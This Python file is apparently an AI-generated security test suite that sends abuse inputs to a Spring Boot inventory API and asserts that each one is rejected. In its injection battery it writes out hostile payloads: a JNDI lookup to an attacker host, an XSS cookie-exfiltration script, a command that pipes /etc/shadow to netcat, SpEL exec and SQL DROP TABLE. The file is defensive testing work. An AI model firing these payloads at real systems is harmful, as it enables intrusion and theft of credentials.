#!/usr/bin/env python3
"""
AI-Generated Adversarial Abuse Case & Security Verification Suite
Framework: Spring Boot Test Harness (Centralized & Syncable Suite)

Covers adversarial abuse categories mapped to OWASP API Security Top 10 & CWE:
  - ABUSE-01: Negative & Zero Quantity Reverse-Deduction Attack (CWE-20 / API8)
  - ABUSE-02: Integer Overflow & Numeric Type Confusion (CWE-190 / CWE-1284)
  - ABUSE-03: Injection Vector Battery: SQLi, XSS, SSTI, JNDI, Traversal (CWE-74 / CWE-917)
  - ABUSE-04: Unbounded Memory Allocation / Cache Pollution DoS (CWE-400 / API4)
  - ABUSE-05: HTTP Parameter Pollution (HPP) & Verb Tampering (CWE-436 / CWE-650)
  - ABUSE-06: Control Character, Null Byte & Oversized Payload Flooding (CWE-158 / CWE-400)
  - ABUSE-07: Error-Path Stack Leak & Security Header Persistence Audit (CWE-200 / CWE-209)
  - ABUSE-08: Adversarial Mixed-Load Concurrency & Conservation Invariant (CWE-362 / CWE-367)
"""

import os
import sys
import threading
import requests

EXPECTED_SECURITY_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Content-Security-Policy": "default-src 'self'",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
}

STACK_LEAK_SIGNATURES = [
    "java.lang.",
    "org.springframework.",
    "jakarta.servlet.",
    "at com.company.",
    "at com.harness.",
    "NullPointerException",
    "NumberFormatException",
]


def _get_base_url(base_url=None):
    if not base_url:
        if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
            base_url = sys.argv[1]
        else:
            base_url = os.getenv("TARGET_URL", "http://localhost:8080")
    return base_url.rstrip("/")


def _assert_no_info_leak_and_headers(resp, context_label):
    body_text = resp.text or ""
    for sig in STACK_LEAK_SIGNATURES:
        assert sig not in body_text, (
            f"[{context_label}] Information disclosure detected ('{sig}') in HTTP {resp.status_code} body"
        )
    assert "Server" not in resp.headers, (
        f"[{context_label}] Server header leaked on HTTP {resp.status_code}: {resp.headers.get('Server')}"
    )
    for hdr, expected_val in EXPECTED_SECURITY_HEADERS.items():
        actual_val = resp.headers.get(hdr)
        assert actual_val == expected_val, (
            f"[{context_label}] Missing or invalid security header '{hdr}' on HTTP {resp.status_code}: "
            f"expected '{expected_val}', got '{actual_val}'"
        )


def test_abuse_01_negative_and_zero_quantity_manipulation(base_url=None):
    """
    [ABUSE-01] Business Logic Abuse: Negative & Zero Quantity Inventory Manipulation
    Attempts reverse-deduction (stock inflation) via negative reservation quantities
    and zero-quantity reservation spam.
    """
    url = _get_base_url(base_url)
    sku = "SKU-ITEM-001"
    initial_stock = 3

    print(f"\n[AI Abuse-01] Testing Negative & Zero Quantity Business Logic Abuse on {sku}...")
    reset_resp = requests.post(
        f"{url}/api/inventory/reset", params={"sku": sku, "quantity": initial_stock}, timeout=5
    )
    assert reset_resp.status_code == 200, f"Reset failed with HTTP {reset_resp.status_code}"

    adversarial_quantities = [
        ("0", "Zero-quantity no-op reservation spam"),
        ("-1", "Single-unit reverse-deduction stock inflation"),
        ("-500", "Bulk negative inventory inflation attack"),
        ("-2147483648", "32-bit signed INT_MIN negation overflow attack"),
        ("1001", "Per-order maximum reservation limit bypass (>1000)"),
        ("2147483647", "32-bit signed INT_MAX exhaustion attack"),
    ]

    for qty_payload, description in adversarial_quantities:
        resp = requests.post(
            f"{url}/api/inventory/reserve",
            params={"sku": sku, "quantity": qty_payload},
            timeout=5,
        )
        print(f"  -> Vector [{qty_payload:>11}] ({description}): HTTP {resp.status_code} {resp.text.strip()}")
        assert resp.status_code == 400, (
            f"Expected HTTP 400 for quantity={qty_payload}, got {resp.status_code}: {resp.text}"
        )
        assert resp.json().get("error") == "INVALID_QUANTITY"
        _assert_no_info_leak_and_headers(resp, f"ABUSE-01:{qty_payload}")

    neg_reset = requests.post(
        f"{url}/api/inventory/reset", params={"sku": sku, "quantity": -99}, timeout=5
    )
    print(f"  -> Vector [  reset=-99] (Negative stock reset corruption): HTTP {neg_reset.status_code} {neg_reset.text.strip()}")
    assert neg_reset.status_code == 400

    status_resp = requests.get(f"{url}/api/inventory/status/{sku}", timeout=5)
    assert status_resp.status_code == 200
    available = status_resp.json().get("available")
    print(f"  [+] Post-attack stock balance verified intact: available={available} (expected {initial_stock})")
    assert available == initial_stock, f"Stock corrupted! Expected {initial_stock}, found {available}"


def test_abuse_02_integer_overflow_and_type_confusion(base_url=None):
    """
    [ABUSE-02] Numeric Boundary, 64/128-bit Integer Overflow & Type Confusion
    Attempts to trigger unhandled NumberFormatException / 500 errors or hex decoding bypass.
    """
    url = _get_base_url(base_url)
    sku = "SKU-ITEM-001"

    print("\n[AI Abuse-02] Testing Integer Overflow & Type Confusion Payloads...")
    type_confusion_vectors = [
        ("99999999999999999999999999999", "128-bit positive integer overflow"),
        ("-99999999999999999999999999999", "128-bit negative integer underflow"),
        ("0x10", "Hexadecimal literal decoding bypass"),
        ("#10", "Hash-prefixed hex literal bypass"),
        ("1.5", "Floating-point fractional reservation"),
        ("1e3", "Scientific notation numeric payload"),
        ("NaN", "IEEE-754 Not-a-Number injection"),
        ("Infinity", "IEEE-754 Infinity injection"),
        ("true", "Boolean type confusion"),
        ("null", "Null literal string confusion"),
        ("[1]", "JSON array parameter confusion"),
    ]

    for payload, desc in type_confusion_vectors:
        resp = requests.post(
            f"{url}/api/inventory/reserve",
            params={"sku": sku, "quantity": payload},
            timeout=5,
        )
        print(f"  -> Vector [{payload:>12}] ({desc}): HTTP {resp.status_code} {resp.text.strip()}")
        assert resp.status_code == 400, (
            f"Expected HTTP 400 for malformed quantity '{payload}', got {resp.status_code}"
        )
        assert resp.json().get("error") == "TYPE_MISMATCH"
        _assert_no_info_leak_and_headers(resp, f"ABUSE-02:{payload}")

    print("  [+] All 11 numeric overflow and type-confusion payloads safely rejected with HTTP 400.")


def test_abuse_03_injection_vector_battery(base_url=None):
    """
    [ABUSE-03] AI Injection Vector Battery (SQLi, XSS, SSTI, JNDI/Log4Shell, Path Traversal)
    Verifies strict rejection on SKU endpoints and safe non-evaluating reflection on /hello.
    """
    url = _get_base_url(base_url)

    print("\n[AI Abuse-03] Executing Multi-Class Injection Battery (SQLi, XSS, SSTI, JNDI, Traversal)...")
    injection_vectors = [
        ("' OR '1'='1'; DROP TABLE inventory; --", "Classic SQL Injection tautology + stacked query"),
        ("${jndi:ldap://evil.attacker.internal:1389/Exploit}", "Log4Shell / JNDI Remote Class Loading"),
        ("*{T(java.lang.Runtime).getRuntime().exec('id')}", "Spring SpEL Expression Injection"),
        ("{{7*7}}_${7*7}", "Server-Side Template Injection (SSTI) probe"),
        ("<script>fetch('https://evil.tld/?c='+document.cookie)</script>", "Reflected DOM/Script XSS"),
        ("\"><svg/onload=alert(document.domain)>", "Attribute-breakout SVG XSS"),
        ("../../../../etc/passwd", "Relative Path Traversal"),
        ("SKU-001; cat /etc/shadow | nc 10.0.0.1 4444", "OS Command Injection delimiter"),
        ("{\"$ne\": null}", "NoSQL Operator Injection"),
        ("", "Empty string default-value coercion probe"),
    ]

    for payload, description in injection_vectors:
        resp = requests.post(
            f"{url}/api/inventory/reserve",
            params={"sku": payload, "quantity": 1},
            timeout=5,
        )
        preview = payload if len(payload) <= 32 else payload[:29] + "..."
        print(f"  -> SKU Vector [{preview:<32}] ({description}): HTTP {resp.status_code}")
        assert resp.status_code == 400, (
            f"Expected HTTP 400 for malicious SKU '{payload}', got {resp.status_code}: {resp.text}"
        )
        assert resp.json().get("error") == "INVALID_SKU"
        _assert_no_info_leak_and_headers(resp, f"ABUSE-03-SKU:{preview}")

    hello_probes = [
        ("${7*7}", "49"),
        ("{{7*7}}", "49"),
        ("<script>alert(1)</script>", None),
        ("${jndi:rmi://127.0.0.1/a}", None),
    ]
    for probe, forbidden_eval in hello_probes:
        resp = requests.get(f"{url}/hello", params={"input": probe}, timeout=5)
        assert resp.status_code == 200
        assert "application/json" in resp.headers.get("Content-Type", "")
        data = resp.json()
        assert data.get("input") == probe, "Input was mutated or evaluated unexpectedly"
        if forbidden_eval:
            assert data.get("input") != forbidden_eval, f"SSTI evaluated {probe} to {forbidden_eval}!"
        _assert_no_info_leak_and_headers(resp, f"ABUSE-03-HELLO:{probe}")

    print("  [+] Injection battery blocked across SKU endpoints and verified non-executing on /hello.")


def test_abuse_04_unbounded_cache_pollution_dos(base_url=None):
    """
    [ABUSE-04] Unbounded Memory Allocation / Cache Pollution DoS (OWASP API4:2023)
    Verifies that reserving non-existent phantom SKUs or oversized SKU strings
    does not allocate entries in the in-memory stock ConcurrentHashMap.
    """
    url = _get_base_url(base_url)

    print("\n[AI Abuse-04] Testing Unbounded Memory Allocation / Phantom SKU Cache Pollution DoS...")
    oversized_sku = "SKU-" + ("X" * 2048)
    over_resp = requests.post(
        f"{url}/api/inventory/reserve",
        params={"sku": oversized_sku, "quantity": 1},
        timeout=5,
    )
    print(f"  -> Oversized SKU (2052 bytes) reserve attempt: HTTP {over_resp.status_code}")
    assert over_resp.status_code == 400
    assert over_resp.json().get("error") == "INVALID_SKU"

    phantom_skus = [f"SKU-PHANTOM-DOS-{i:04d}" for i in range(15)]
    for p_sku in phantom_skus:
        res = requests.post(
            f"{url}/api/inventory/reserve",
            params={"sku": p_sku, "quantity": 1},
            timeout=5,
        )
        assert res.status_code == 409, f"Expected 409 for phantom SKU {p_sku}, got {res.status_code}"
        status_check = requests.get(f"{url}/api/inventory/status/{p_sku}", timeout=5)
        assert status_check.status_code == 404, (
            f"Cache pollution vulnerability! Phantom SKU {p_sku} was allocated in memory (HTTP {status_check.status_code})"
        )

    print("  [+] Verified 15 phantom SKU probes did not pollute in-memory state (all returned 404 on status lookup).")


def test_abuse_05_http_parameter_pollution_and_verb_tampering(base_url=None):
    """
    [ABUSE-05] HTTP Parameter Pollution (HPP) & Protocol Verb Tampering
    Tests duplicate query parameters to bypass validation and disallowed HTTP methods.
    """
    url = _get_base_url(base_url)

    print("\n[AI Abuse-05] Testing HTTP Parameter Pollution (HPP) & HTTP Method Tampering...")
    hpp_queries = [
        ("/api/inventory/reserve?sku=SKU-ITEM-001&quantity=1&quantity=-500", "POST", "Duplicate quantity (valid + negative)"),
        ("/api/inventory/reserve?sku=SKU-ITEM-001&sku=SKU-ITEM-002&quantity=1", "POST", "Duplicate SKU target confusion"),
        ("/api/inventory/reset?sku=SKU-ITEM-001&quantity=1&quantity=9999", "POST", "Duplicate reset quantity"),
        ("/hello?input=safe&input=second", "GET", "Duplicate /hello input parameter"),
    ]

    for path_query, method, desc in hpp_queries:
        resp = requests.request(method, f"{url}{path_query}", timeout=5)
        print(f"  -> HPP [{method} {path_query}]: HTTP {resp.status_code} ({desc})")
        assert resp.status_code == 400, f"Expected HTTP 400 for HPP '{path_query}', got {resp.status_code}"
        assert resp.json().get("error") == "PARAMETER_POLLUTION"
        _assert_no_info_leak_and_headers(resp, f"ABUSE-05-HPP:{path_query}")

    verb_vectors = [
        ("GET", "/api/inventory/reserve"),
        ("PUT", "/api/inventory/reserve"),
        ("DELETE", "/api/inventory/reserve"),
        ("GET", "/api/inventory/reset"),
        ("DELETE", "/api/inventory/reset"),
    ]
    for verb, endpoint in verb_vectors:
        resp = requests.request(verb, f"{url}{endpoint}", params={"sku": "SKU-ITEM-001", "quantity": 1}, timeout=5)
        print(f"  -> Verb Tampering [{verb:<6} {endpoint}]: HTTP {resp.status_code} {resp.text.strip()}")
        assert resp.status_code == 405, f"Expected HTTP 405 for {verb} {endpoint}, got {resp.status_code}"
        assert resp.json().get("error") == "METHOD_NOT_ALLOWED"
        _assert_no_info_leak_and_headers(resp, f"ABUSE-05-VERB:{verb}:{endpoint}")


def test_abuse_06_control_chars_and_oversized_payloads(base_url=None):
    """
    [ABUSE-06] Control Character, Null Byte, CRLF & Oversized Payload Flooding
    """
    url = _get_base_url(base_url)

    print("\n[AI Abuse-06] Testing Control Characters, Null Bytes, CRLF & Oversized Payloads...")
    app_layer_malicious_inputs = [
        ("A" * 512, "Oversized 512-byte query string buffer probe (>256 max)"),
        ("A" * 4096, "Oversized 4 KB application-layer query string flood"),
        ("normal\x00hidden", "Null-byte string truncation injection"),
        ("line1\r\nX-Split-Header: injected", "CRLF HTTP Response Splitting attempt"),
        ("\x1b[31mANSI_ESCAPE_INJECTION\x1b[0m", "Terminal ANSI escape sequence log injection"),
        ("\x07\x08\x0c", "ASCII bell/backspace/formfeed control chars"),
    ]

    for payload, desc in app_layer_malicious_inputs:
        resp = requests.get(f"{url}/hello", params={"input": payload}, timeout=5)
        print(f"  -> Payload ({desc}, len={len(payload)}): HTTP {resp.status_code} {resp.text.strip()}")
        assert resp.status_code == 400, f"Expected HTTP 400 for {desc}, got {resp.status_code}"
        assert resp.json().get("error") == "INVALID_INPUT"
        _assert_no_info_leak_and_headers(resp, f"ABUSE-06:{desc}")

    connector_flood = "A" * 8192
    flood_resp = requests.get(f"{url}/hello", params={"input": connector_flood}, timeout=5)
    print(
        f"  -> Connector Guard (8 KB raw URI header flood, len={len(connector_flood)}): "
        f"HTTP {flood_resp.status_code} (Blocked at HTTP connector boundary)"
    )
    assert flood_resp.status_code in (400, 414), (
        f"Expected HTTP 400/414 from connector guard, got {flood_resp.status_code}"
    )
    assert "Server" not in flood_resp.headers
    for sig in STACK_LEAK_SIGNATURES:
        assert sig not in (flood_resp.text or "")


def test_abuse_07_error_path_security_header_persistence(base_url=None):
    """
    [ABUSE-07] Error-Path Information Disclosure & Security Header Persistence Audit
    Verifies 400, 404, 405, and 409 responses never drop security headers or leak server/stack metadata.
    """
    url = _get_base_url(base_url)

    print("\n[AI Abuse-07] Auditing Security Headers & Zero Stack Leakage Across All Error Status Codes...")
    requests.post(f"{url}/api/inventory/reset", params={"sku": "SKU-ITEM-001", "quantity": 0}, timeout=5)

    error_probes = [
        (400, lambda: requests.post(f"{url}/api/inventory/reserve", params={"sku": "SKU-ITEM-001", "quantity": -5}, timeout=5)),
        (404, lambda: requests.get(f"{url}/api/inventory/status/SKU-NONEXISTENT-999", timeout=5)),
        (404, lambda: requests.get(f"{url}/non-existent-admin-console", timeout=5)),
        (405, lambda: requests.get(f"{url}/api/inventory/reserve", timeout=5)),
        (409, lambda: requests.post(f"{url}/api/inventory/reserve", params={"sku": "SKU-ITEM-001", "quantity": 1}, timeout=5)),
    ]

    for expected_status, req_fn in error_probes:
        resp = req_fn()
        print(f"  -> Error Status Audit [Expected HTTP {expected_status} -> Got HTTP {resp.status_code}]: Headers Verified")
        assert resp.status_code == expected_status
        _assert_no_info_leak_and_headers(resp, f"ABUSE-07:HTTP-{expected_status}")


def test_abuse_08_adversarial_mixed_concurrency_invariant(base_url=None):
    """
    [ABUSE-08] Adversarial Mixed-Load Concurrency & Conservation Invariant Verification
    Simultaneously fires 20 threads:
      - 12 legitimate multi-unit reservation requests (quantities 1, 2, 3)
      - 8 adversarial threads attempting negative quantities, overflows, and SQLi SKUs during lock contention
    Asserts strict inventory conservation: sum(reserved_units) + final_available == initial_stock
    and verifies stock never dips below 0.
    """
    url = _get_base_url(base_url)
    sku = "SKU-ITEM-002"
    initial_stock = 10

    print(f"\n[AI Abuse-08] Firing 20-Thread Adversarial Mixed-Load Concurrency Burst on {sku} (initial_stock={initial_stock})...")
    reset_resp = requests.post(
        f"{url}/api/inventory/reset", params={"sku": sku, "quantity": initial_stock}, timeout=5
    )
    assert reset_resp.status_code == 200

    legit_workloads = [("LEGIT", sku, 1)] * 6 + [("LEGIT", sku, 2)] * 4 + [("LEGIT", sku, 3)] * 2
    adversarial_workloads = [
        ("ABUSE_NEG", sku, -5),
        ("ABUSE_NEG", sku, -100),
        ("ABUSE_ZERO", sku, 0),
        ("ABUSE_MAX", sku, 5000),
        ("ABUSE_OVERFLOW", sku, "999999999999999999999"),
        ("ABUSE_HEX", sku, "0x05"),
        ("ABUSE_SQLI", "' OR 1=1--", 1),
        ("ABUSE_JNDI", "${jndi:ldap://127.0.0.1/a}", 1),
    ]

    all_workloads = legit_workloads + adversarial_workloads
    total_threads = len(all_workloads)
    barrier = threading.Barrier(total_threads)
    results = []
    lock = threading.Lock()

    def worker(idx, kind, target_sku, qty):
        barrier.wait()
        resp = requests.post(
            f"{url}/api/inventory/reserve",
            params={"sku": target_sku, "quantity": qty},
            timeout=5,
        )
        with lock:
            results.append((idx, kind, qty, resp.status_code, resp.json()))

    threads = [
        threading.Thread(target=worker, args=(i, w[0], w[1], w[2]))
        for i, w in enumerate(all_workloads)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    reserved_units = 0
    legit_200 = 0
    legit_409 = 0
    abuse_400 = 0

    for idx, kind, qty, code, body in sorted(results, key=lambda x: x[0]):
        if kind == "LEGIT":
            assert code in (200, 409), f"Unexpected status {code} for LEGIT thread: {body}"
            if code == 200:
                legit_200 += 1
                reserved_units += int(qty)
                assert body.get("remaining") >= 0, f"Negative remaining stock observed: {body}"
            else:
                legit_409 += 1
        else:
            assert code == 400, f"Adversarial thread ({kind}, qty={qty}) was not blocked with 400! Got {code}: {body}"
            abuse_400 += 1

    status_resp = requests.get(f"{url}/api/inventory/status/{sku}", timeout=5)
    assert status_resp.status_code == 200
    final_available = status_resp.json().get("available")

    print(
        f"  -> Legit Approved (200 OK): {legit_200} threads ({reserved_units} units reserved) | "
        f"Out-of-Stock (409): {legit_409} threads | Adversarial Blocked (400): {abuse_400}/8 threads"
    )
    print(
        f"  -> Conservation Invariant : reserved({reserved_units}) + remaining({final_available}) == "
        f"{reserved_units + final_available} (initial={initial_stock})"
    )

    assert abuse_400 == len(adversarial_workloads)
    assert final_available >= 0
    assert reserved_units + final_available == initial_stock, (
        f"Conservation invariant violated! reserved={reserved_units} + final={final_available} != {initial_stock}"
    )

    requests.post(f"{url}/api/inventory/reset", params={"sku": "SKU-ITEM-001", "quantity": 1}, timeout=5)
    requests.post(f"{url}/api/inventory/reset", params={"sku": "SKU-ITEM-002", "quantity": 5}, timeout=5)


def run_all_abuse_tests(base_url=None):
    url = _get_base_url(base_url)
    test_abuse_01_negative_and_zero_quantity_manipulation(url)
    test_abuse_02_integer_overflow_and_type_confusion(url)
    test_abuse_03_injection_vector_battery(url)
    test_abuse_04_unbounded_cache_pollution_dos(url)
    test_abuse_05_http_parameter_pollution_and_verb_tampering(url)
    test_abuse_06_control_chars_and_oversized_payloads(url)
    test_abuse_07_error_path_security_header_persistence(url)
    test_abuse_08_adversarial_mixed_concurrency_invariant(url)
    print("\n[+] SUCCESS: All 8 AI-generated abuse case categories passed verification!")
    return True


if __name__ == "__main__":
    run_all_abuse_tests()
